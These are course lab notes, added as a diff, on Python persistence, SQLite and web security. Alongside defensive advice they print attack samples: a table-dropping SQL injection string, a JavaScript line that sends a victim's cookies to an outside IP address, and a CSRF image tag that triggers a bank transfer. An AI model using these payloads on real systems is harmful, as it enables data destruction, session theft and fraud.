@@ -1,0 +1,793 @@
+------------------------------
+Lab #14 -- Databases; security
+------------------------------
+
+A programming joke:
+
+---
+
+Knock, knock.
+
+"Who's there?"
+
+very long pause...
+
+"Java."
+
+
+Data persistence and ACID
+-------------------------
+
+You want your databases to be ACID compliant.
+
+Pickle, shelve, and bsddb
+-------------------------
+
+Python possesses a native serialization format that allows objects
+to be written into a string (and thence to disk), called 'pickle'.
+You use 'pickle.dump' to save:
+
+  >>> import pickle
+  >>> obj_to_save = [ "foo", 5, 8.2 ]
+  >>> fp = open('some_file', 'w')
+  >>> pickle.dump(obj_to_save, fp)
+  >>> fp.close()
+
+Now you can use 'pickle.load' to reload:
+
+  >>> fp = open('some_file')
+  >>> x = pickle.load(fp)
+  >>> print x
+  [ "foo", 5, 8.2 ]
+
+Voila!
+
+So, one way to persist the messages, users, and sessions in meeplib
+(see HW) is to simply pickle the dictionaries.  However, then every
+time you make a chance to the dictionaries you need to save them
+again, which (for large #s of users) can get big.
+
+The 'shelve' module lets you save individual objects in a database
+by putting pickle on top of a database:
+
+ >>> import shelve
+ >>> db = shelve.open('foo.db')
+ >>> db['some key'] = [ "foo", 5, 8.2 ]
+ >>> db.sync()
+
+Now you can 
+
+ >>> db.close()
+ >>> db = shelve.open('foo.db')
+ >>> print db['some_key']
+ [ 'foo', 5, 8.2 ]
+
+You can do this with Message objects, User objects, and session information,
+too...
+
+ >>> from meeplib import Message
+ >>> u = User('test', 'foo')
+ >>> m = Message('some title', 'some post', u)
+
+ >>> db[str(m.id)] = m
+
+Note that shelve doesn't let you store things by integer key, so you need
+to store the record by a string conversion of the key.
+
+Relational databases and SQL
+----------------------------
+
+Basic SQL concepts:
+
+Start by creating/defining a "schema"
+
+Schema contains a description of each table (collection of related data)
+in terms of *columns* (names/types of data).  Each table can then have
+multiple *rows*.  (...a bit like a spreadsheet)
+
+ - strong types: INT, TEXT, FLOAT
+ - pickiness
+ - non-default values
+
+   CREATE TABLE x (a TYPE, b TYPE, c TYPE)
+
+Adding, updating, and deleting data
+
+  INSERT
+
+  UPDATE
+
+  DELETE FROM
+
+Selecting data from a single table 'a'
+
+  SELECT * FROM a 
+
+Selecting data from multiple tables 'a', 'b', 'c'
+
+  SELECT * FROM a, b, c WHERE a.id = b.id AND b.id = c.id
+
+Cartesian join (all x all) vs ...
+
+Primary keys
+
+References between tables --
+
+  "referential constraint" -- "if a row in this table exists, a corresponding
+    row in this other table must also exist"
+
+  enables speedup/indexing on SELECT, as well
+
+Transactions and isolation between transactions
+
+  BEGIN TRANSACTION
+  COMMIT
+  ROLLBACK
+
+SQL injection attacks
+
+  If you let someone remote inject SQL queries then you will regret it :) --
+  imagine,
+
+     DELETE FROM users
+ 
+  or 
+
+     INSERT INTO users (username, is_admin) VALUES ('me', 't')
+
+Thinks to think about:
+
+Where does the processing happen?
+
+Permissions/access to database & file
+
+Constraints on data.
+
+Full documentation for the Python interface to sqlite, the sqlite3 module,
+here:
+
+   http://www.python.org/doc/2.5.2/lib/module-sqlite3.html
+
+Documentation for sqlite's query language is here:
+
+   http://www.sqlite.org/lang.html
+
+Note that sqlite3 is not installed under the central Python
+distribution on arctic.  You need to use it on adriatic.
+
+sqlite basics
+-------------
+
+First, load in a database with 'connect':
+
+   >>> import sqlite3
+   >>> conn = sqlite3.connect('test.db')
+
+Now, get a *cursor* that lets you interact with the database:
+
+   >>> c = conn.cursor()
+
+Let's start by creating a simple table:
+
+   >>> c.execute("CREATE TABLE users (id INTEGER PRIMARY KEY, username TEXT NOT NULL, password TEXT NOT NULL)")
+
+Now let's insert some data into it:
+
+   >>> c.execute("INSERT INTO users (username, password) VALUES ('tim', 'xxx')")
+
+We can immediately retrieve this with a SELECT:
+
+   >>> c.execute("SELECT * FROM users")
+   >>> print c.fetchall()
+   [(1, u'tim', u'xxx')]
+
+We get the strings back as Unicode strings; that's what the "u" means.
+You can treat these as regular strings for all intents and purposes.
+
+Note here that the primary index value 'id' was automatically
+assigned; we didn't specify a value on the INSERT, but sqlite knows
+that primary key values should be automatically set.
+
+What happens if we don't specify a value on an INSERT?  Well, by
+default, unspecified values are set to NULL; in this case, however, we
+specified that the username and password *can't* be NULL.  What happens?
+
+Well, let's see:
+
+  >>> c.execute("INSERT INTO users (username) VALUES ('fiddledy')")
+  Traceback (most recent call last):
+     ...
+  IntegrityError: users.password may not be NULL
+
+Yep, an exception...
+
+All right, let's create another table, this one with a key that references
+'users':
+
+   >>> c.execute('CREATE TABLE fruits (user_id INTEGER REFERENCES users, fruit TEXT NOT NULL)')
+
+Now we can assign 'tim', our lone user, a fruit:
+
+   >>> c.execute("INSERT INTO fruits (user_id, fruit) VALUES (1, 'orange')")
+
+and we can retrieve Tim's fruit preferences using a join:
+
+  >>> c.execute('SELECT * FROM users, fruits WHERE users.id = fruits.user_id')
+  >>> print c.fetchall()
+  [(1, u'tim', u'xxx', 1, u'orange')]
+
+So what are these values?  Well, the 'SELECT \*' just tells sqlite to pull
+out all of the values in both tables, joining them into one big row -- so
+the first three values are users.id, users.username, and users.password,
+and the last two values are fruits.user_id and fruits.fruit.  You can clean
+this up a bit by specifying exactly what you want to be retrieved:
+
+  >>> c.execute('SELECT users.username, users.password, fruits.fruit FROM users, fruits WHERE users.id = fruits.user_id')
+  >>> for x in c:
+  ...    print x
+  (u'tim', u'xxx', u'orange')
+
+We can also change the name of the fruit if we want to, by doing an UPDATE:
+
+  >>> c.execute("UPDATE fruits SET fruit='Orangen' WHERE fruit='orange'")
+
+  >>> c.execute('SELECT users.username, users.password, fruits.fruit FROM users, fruits WHERE users.id = fruits.user_id')
+  >>> for x in c:
+  ...    print x
+  (u'tim', u'xxx', u'Orangen')
+
+What if we want to delete things?   Simplicity itself:
+
+  >>> c.execute("DELETE FROM fruits WHERE fruit='Orangen'")
+  >>> c.execute('SELECT users.username, users.password, fruits.fruit FROM users, fruits WHERE users.id = fruits.user_id')
+  >>> print c.fetchall()
+  []
+
+Yep, nothing left!
+
+OK, let's set up some more complicated examples.  Three users, four fruits...
+
+  >>> c.execute("INSERT INTO users (username, password) VALUES ('beth', 'foo')")
+  >>> c.execute("INSERT INTO users (username, password) VALUES ('chet', 'fib')")
+
+  >>> c.execute("SELECT id FROM users WHERE username='tim'")
+  >>> (tim_id,) = c.fetchone()
+
+  >>> c.execute("SELECT id FROM users WHERE username='beth'")
+  >>> (beth_id,) = c.fetchone()
+
+  >>> c.execute("INSERT INTO fruits (user_id, fruit) VALUES (?, 'orange')", (tim_id,))
+
+  >>> c.execute("INSERT INTO fruits (user_id, fruit) VALUES (?, 'apple')", (beth_id,))
+  >>> c.execute("INSERT INTO fruits (user_id, fruit) VALUES (?, 'orange')", (beth_id,))
+
+OK, so we've set things up so that tim likes oranges, beth likes
+apples and oranges, and chet doesn't like any fruit.  Let's start by
+doing a simple query to retrieve all of this info:
+
+  >>> c.execute("SELECT users.id, username, fruit FROM users, fruits WHERE fruits.user_id=users.id")
+  >>> for (id, username, fruit) in c:
+  ...    print id, username, fruit
+  1 tim orange
+  2 beth apple
+  2 beth orange
+
+Good so far!
+
+In class I mentioned that joins are done using a Cartesian cross product; what does that mean?  Well, let's see what happens without a WHERE clause:
+
+  >>> c.execute('SELECT users.id, username, fruit FROM users, fruits')
+  >>> for (id, username, fruit) in c:
+  ...   print id, username, fruit
+  1 tim orange
+  1 tim apple
+  1 tim orange
+  2 beth orange
+  2 beth apple
+  2 beth orange
+  3 chet orange
+  3 chet apple
+  3 chet orange
+
+What!?  Well, what's happening here is that without a WHERE clause,
+the join by default takes all rows from both tables, and combines
+them.  If you ever find yourself getting unexpected results from a SELECT,
+this may be one of the reasons.
+
+Let's go back to the correct join:
+
+  >>> c.execute("SELECT users.id, username, fruit FROM users, fruits WHERE fruits.user_id=users.id")
+  >>> for (id, username, fruit) in c:
+  ...    print id, username, fruit
+  1 tim orange
+  2 beth apple
+  2 beth orange
+
+Note how the results are in order of ID: that's an accident. sqlite
+gives no guarantees on the order of the output from a SELECT query,
+**unless** you specify an ORDER BY clause.  So, for example, we can
+arrange things here by fruit and then by id by specifying that fruit
+should be sorted in ascending order (abbreviated ASC), and equal fruit
+rows should then be secondarily sorted on the id in descending order
+(DESC):
+
+  >>> c.execute("SELECT users.id, username, fruit FROM users, fruits WHERE fruits.user_id=users.id ORDER BY fruit ASC, id DESC")
+  >>> for (id, username, fruit) in c:
+  ...    print id, username, fruit
+  2 beth apple
+  2 beth orange
+  1 tim orange
+
+OK, now let's do something a bit different -- let's count the number of fruits that each person likes.
+
+  >>> c.execute("SELECT username, COUNT(fruit) FROM users, fruits WHERE fruits.user_id = users.id GROUP BY users.id")
+  >>> c.fetchall()
+  [(u'tim', 1), (u'beth', 2)]
+
+What does the GROUP BY do?  Well, COUNT is an aggregate function that
+works *across* multiple rows; GROUP BY says that rows should be
+grouped together on the basis of their users.id value, so COUNT is
+only run across the grouped-by rows.
+
+Hmm, but wait a sec -- where's chet?  Chet doesn't like any fruits, so
+we should get a zero for him, right?  Well, yes, but you might have
+noticed that chet doesn't actually appear in *any* of the queries above.
+What's up?
+
+Well, with a default join, SQL doesn't represent nonexistent joined
+rows!  That is, it's hard for SQL to report rows that don't exist --
+unless you tell it to put NULLs there.  That's what a LEFT JOIN does:
+
+  >>> c.execute("SELECT id, username, fruit FROM users LEFT JOIN fruits ON fruits.user_id=users.id")
+  >>> for (id, username, fruit) in c:
+  ...    print id, username, fruit
+  1 tim orange
+  2 beth apple
+  2 beth orange
+  3 chet None
+
+Hey, look, there's chet!  What happens if we do the GROUP BY again?
+
+  >>> c.execute("SELECT username, COUNT(fruit) FROM users LEFT JOIN fruits ON fruits.user_id=users.id GROUP BY users.id")
+  >>> c.fetchall()
+  [(u'tim', 1), (u'beth', 2), (u'chet', 0)]
+
+COUNT understands that a NULL means nothin' there, so that's good.
+
+Transactions
+~~~~~~~~~~~~
+
+sqlite does support transactions; how does this work?
+
+Let's start with our last example:
+
+  >>> c.execute("SELECT username, COUNT(fruit) FROM users LEFT JOIN fruits ON fruits.user_id=users.id GROUP BY users.id")
+  >>> c.fetchall()
+  [(u'tim', 1), (u'beth', 2), (u'chet', 0)]
+
+Now let's delete 'tim':
+
+  >>> c.execute("DELETE FROM users WHERE username='tim'")
+
+  >>> c.execute("SELECT username, COUNT(fruit) FROM users LEFT JOIN fruits ON fruits.user_id=users.id GROUP BY users.id")
+  >>> c.fetchall()
+  [(u'beth', 2), (u'chet', 0)]
+
+OK, so tim isn't in there any more; excellent.  But we haven't saved it, so
+if we opened the sqlite database from another program, 'tim' would still be
+there.  We can save it for public view by doing a 'conn.commit()':
+
+  >>> conn.commit()
+
+What if we decided for some reason that we didn't want to commit the change,
+but rather wanted to reverse it?  Well, let's try deleting 'chet':
+
+  >>> c.execute("DELETE FROM users WHERE username='chet'")
+
+  >>> c.execute("SELECT username, COUNT(fruit) FROM users LEFT JOIN fruits ON fruits.user_id=users.id GROUP BY users.id")
+  >>> c.fetchall()
+  [(u'beth', 2)]
+
+..but oops, we didn't want to save that -- rollback!
+
+  >>> conn.rollback()
+
+Is chet still there?
+
+  >>> c.execute("SELECT username, COUNT(fruit) FROM users LEFT JOIN fruits ON fruits.user_id=users.id GROUP BY users.id")
+  >>> c.fetchall()
+  [(u'beth', 2), (u'chet', 0)]
+
+Yep!
+
+For now, all you really need to do is to be sure to call
+'conn.commit()' in order to save any actions that you want saved.
+
+SQL injection and positional parameters
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+If you create queries by concatenating or interpolating strings that
+come directly from the user, they can "attack" your database by
+sending you straight SQL strings.  For example, suppose you were
+inserting a new username and password into the users table
+
+  >>> username="robert'); DROP TABLE users; --"
+  >>> password="foo"
+  >>> sql = "INSERT INTO users (username, password) VALUES ('%s', '%s')" % (username, password)
+  >>> print sql
+  INSERT INTO users (username, password) VALUES ('robert'); DROP TABLE users; --, 'foo');
+
+Now if you execute that, what happens?  The users table will go away...
+
+So, the general problem is that user-specified data may well be badly
+formatted and can screw up (intentionally or unintentionally) your SQL
+queries.  How do you deal with this?!
+
+Well, almost all SQL interfaces in all languages offer safe variable
+interpolation via *placeholders*, that is, you just a '?' in as a place
+holder and the SQL interface inserts the values safely:
+
+  >>> c.execute('INSERT INTO users (username, password) VALUES (?, ?)', (username, password,))
+
+  >>> c.execute('SELECT username FROM users ORDER BY username')
+  >>> print c.fetchall()
+  [(u'beth',), (u'chet',), (u"robert'); DROP TABLE users; --",), (u'tim',)]
+
+---
+
+Another joke:
+
+So, this SQL query walks into a bar, goes up to two tables and says,
+"Can I join you?"
+
+Security
+--------
+
+How do we stop bad people from doing bad things?
+
+"All input is evil until proven otherwise."
+
+It is not often done well:
+
+.. image:: voting_machines.png
+   :width: 600
+
+**Paranoia is not just a state of mind, it's a way of life.**
+
+Goals
+~~~~~
+
+1. (Client) Communicate with specific server.
+
+2. (Server) Identify user while protecting against *systematic* user compromise.
+3. (Client & server) Communicate *securely* (no eavesdropping)
+
+4. (Server) Handle a lot of users.
+
+Note that "client" cannot be trusted here: could be Evil Canadian
+Hacker, _or_ could simply be genuine malicious user.  The difference
+is not significant for a site!
+
+Will talk mostly about protocol- and browser-level attacks; network
+infrastructure attacks are also likely but outside our scope!
+
+An excellent real-world example: man in the middle attack
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+("MiG in the middle" story.)
+
+(Could also imagine compromising the endpoints.)
+
+Problems
+~~~~~~~~
+
+Statelessness - every connection "starts fresh", so can't use single
+authentication.  Must communicate data... but is that data secure?
+
+How do you identify a Web site securely, anyway??
+
+And then there's eavesdropping.
+
+So, the parameters of the problem are:
+
+ - must identify server
+ - must protect data in browser from being sent to wrong server
+ - must protect communications from eavesdroppers
+ - server must protect against client-altered data, e.g. changed username
+
+Technologies
+~~~~~~~~~~~~
+
+Establishing a connection to the right host - DNS, server certificates
+
+Communicating securely with the host - HTTPS
+
+Establishing user identity - authentication
+
+Statelessness - URLs, cookies, and forms
+
+Preventing large-scale compromise - session IDs and hashing
+
+Connection-oriented security
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+Looking up Web sites (Domain Name Service, DNS)
+
+ - think of it as a phone book: name => number.
+
+ - but a phone book with a hierarchical distrib scheme: master servers
+   dynamically updated DNS.
+
+ - fairly insecure: your ISP usually gives you the name servers to use
+   via DHCP, and you have no guarantee that they are correct or
+   untampered with.
+
+Connecting safely to Web sites (HTTPS and server-side certificates)
+
+ - S == "Secure Socket Layer"
+
+ - end-to-end encryption based on key pairs
+
+How do you know you're talking to the right site??
+
+ - digitally-signed certificates: "this site at xxx.yyy.zzz possesses
+   a private certificate, signed by BigCentralAuthority", that identifies
+   them as the genuine xxx.yyy.zzz site."
+
+ - umm, how do you know it's xxx.yyy.zzz, anyway?  DNS told you...
+
+ - certificates must be hard to forge.
+
+ - you must trust BigCentralAuthority to not issue multiple certificates.
+
+ - end-to-end makes it proof against man-in-the-middle attacks.
+
+Note: BigCentralAuthority can delegate other sites to issue certificates,
+too, using a chain of trust.
+
+(Note: Forging connections is not that difficult, and scales.  Taking
+over your computer is easier, but doesn't scale as well..)
+
+Social engineering, or "compromising the user"
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+A sucker is born every minute!
+
+"Hello, we are the support desk for YourBigBank.  What is your username
+and password so that we can verify your account information?"
+
+Mangled or confusing or internationalized URLs:
+
+  http://www.yourbank.example.com/
+  http://www.google.com@members.tripod.com/
+
+e.g. 0/O and l/1, but with internationalization.
+
+Denial of Service (DoS)
+~~~~~~~~~~~~~~~~~~~~~~~
+
+"Here's a 1gb file."
+
+"Here's another 500 of them.  Tasty?"
+
+Can saturate:
+
+ - connections
+ - bandwidth
+ - disk space and RAM
+ - concurrent connection handling
+
+In some cases (connection, bandwidth) you must protect @ network level.
+
+In other cases (disk space, concurrent connection handling) can regulate
+within the server.
+
+Most Web servers do not do this well!  Specialized mechanisms exist for
+filtering and proxying.
+
+Buffer overruns
+~~~~~~~~~~~~~~~
+
+Server uses a fixed-width buffer of size N; client sends N+ data; remaining
+data sent overwrites (eventually) server code => client can run arbitrary
+code on server.
+
+In the days of C server code, this was a very common attack: ::
+
+   char buf[256];
+   recv(buf, amount);
+
+What if 'amount' is negative, or not properly calculated? => buf overflow.
+
+Bleah.
+
+Now most new networking code is written in something other than C; better
+languages (e.g. Python ;) dynamically allocate buffers.
+
+...but think about the denial of service aspect: perhaps the C route is
+better, because it won't dynamically allocate 1gb of RAM to receive!
+
+SQL injection
+~~~~~~~~~~~~~
+
+SQL databases are very common esp at big companies, so specific attacks
+against them have been designed.
+
+.. image:: exploits_of_a_mom.png
+   :width: 600
+
+Malformed quoting or other "games" with usernames, input values, etc.
+
+That's why you *always* use placeholders ('?') in your SQL queries.
+
+Remember, user input is *dirty*.  *Sanitize it*.
+
+XSS: Cross-Site Scripting
+~~~~~~~~~~~~~~~~~~~~~~~~~
+
+(a.k.a. "HTML injection")
+
+If attackers can inject arbitrary HTML into your browser, including
+HTML containing valid JavaScript, then attackers can control your
+browser.
+
+For example, unquoted posts in message boards or error message display
+allow you to "take over" a browser.
+
+Works within "same-origin" policy sandbox: JavaScript originates from same site
+that sent pages & cookies, so the JS can load pages, manipulate cookies,
+etc.
+
+(Demo with ::
+
+   <script type='text/javascript'>alert('fiz');</script>
+
+You can use the ``|e`` filter in Jinja2 templating to escape messages, though!
+
+Again, user input is *dirty*.  *Sanitize it*.
+
+The real problem with XSS is that it bypasses the JavaScript security
+model, in which JavaScript can only access items (cookies, URLs). In
+the XSS case, *your* site (the meep message board, for example) is the
+one serving the JS even though a malicious Evil Canadian Hacker is the
+one writing it.
+
+XSS and HttpOnly: Protecting the Cookie Jar
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+Can mark your cookies as inaccessible to JavaScript with HttpOnly: ::
+
+  Set-Cookie: ASP.NET_SessionId=ig2fac55; path=/; HttpOnly   
+
+This protects against a specific class of attacks that sends your
+cookies to another URL with a JS redirect: ::
+ 
+   window.location="http://1.2.3.4:81/r.php?u="
+   +document.links[1].text
+   +"&l="+document.links[1]
+   +"&c="+document.cookie;
+
+Browser support is still spotty (e.g. FF doesn't entirely work).
+
+Only protects against a particularly *easy* set of XSS attacks...
+
+XSRF: Cross-Site Request Forgeries
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+   CSRF vulnerabilities occur when a website allows an authenticated
+   user to perform a sensitive action but does not verify that the
+   user herself is invoking that action. The key to understanding CSRF
+   attacks is to recognize that websites typically don't verify that a
+   request came from an authorized user. Instead they verify only that
+   the request came from the browser of an authorized user. Because
+   browsers run code sent by multiple sites, there is a danger that
+   one site will (unbeknownst to the user) send a request to a second
+   site, and the second site will mistakenly think that the user
+   authorized the request.
+
+       -- Bill Zeller
+
+Take advantage of stateful mechanisms in browsers designed to help
+"chain" multiple requests, like your message delete mechanism.
+Basically, POST directly to another URL.
+
+e.g. for meep, read
+
+    http://class.ged.idyll.org/svn/files/hw10/solutions/meep_example_app.py
+
+and now imagine what happens when you do ::
+
+    GET /m/del_action?del_message=1
+
+If you're logged into your meep site, and then another site has the
+above link to the first site (or malicious XSS/JavaScript redirecting
+you to that URL) you will delete message #1!
+
+Annoying -- now imagine
+
+  <img src="http://foobank.com/transfer_money?src_account=checking&...&confirm=yes">
+
+Attack model:
+
+ - you're logged into your bank in one tab/window, or have a login cookie
+
+ - you go to another site run by the Evil Canadian Hackers
+
+ - ECH site builds a URL (either within a form or with JavaScript)
+   confirming a bank transfer into ECH's bank account (or an e-bay
+   purchase, or a paypal transaction...)
+
+ - ECH site gives you this URL to load (with JS, image link, etc.)
+
+With JS or image URLs or ..., you may not even know that the attack is
+taking place!
+
+Why does this vulnerability exist?  Chaining forms, for example.
+
+Protection mechanisms:
+
+ - check HTTP referrer (which can break for other reasons).
+
+ - Secret, hidden, dynamically generated form value on all your forms.
+
+ - Inject your site cookies into your forms with JavaScript, and then
+   compare browser cookies with form values received.  This ensures that
+   the author of the forms had direct access to the cookie information.
+
+And again, user input (URLs) is *dirty*... etc.
+
+Cookies and sessions
+~~~~~~~~~~~~~~~~~~~~
+
+I'm sure you've noticed that the browser can send whatever cookie it
+wants.  So, for your meep stuff, you can become whatever user you want.
+How do you protected against this?
+
+Have the *server* generate a large random number (see uuid & homework #12)
+and set that as the cookie; and then associate the cookie with the user
+on the server side.
+
+This means that Evil Candian Hackers have to guess a large random
+number properly in order to gain access to your account.  (And it's
+probably easier to guess your password...)
+
+Now, link that cookie to the IP address from which the user logs in,
+and it's even more secure.
+
+Two principles for thinking securely about security
+---------------------------------------------------
+
+ 1. Do you follow the rule that all input is evil until proven otherwise?
+
+ 2. Can you detect a man-in-the-middle attack?
+
+#1 is up to you.
+
+#2 is architectural: the Web is vulnerable to certain
+man-in-the-middle attacks, but if you use HTTPS you're probably as
+good as most banks.
+
+Either way, remember: the devil is in the details.  KISS so that at least
+flaws will be obvious to everyone!
+
+References
+----------
+
+MiG-in-the-middle attack - use Google.
+
+RSA encryption algorithm:
+
+   http://en.wikipedia.org/wiki/RSA
+
+Cross-site scripting:
+
+   http://en.wikipedia.org/wiki/Cross-site_scripting
+
+Cross-Site Request Forgeries and You:
+
+   http://www.codinghorror.com/blog/archives/001171.html
+
+HttpOnly cookies:
+
+   http://www.codinghorror.com/blog/archives/001167.html
+
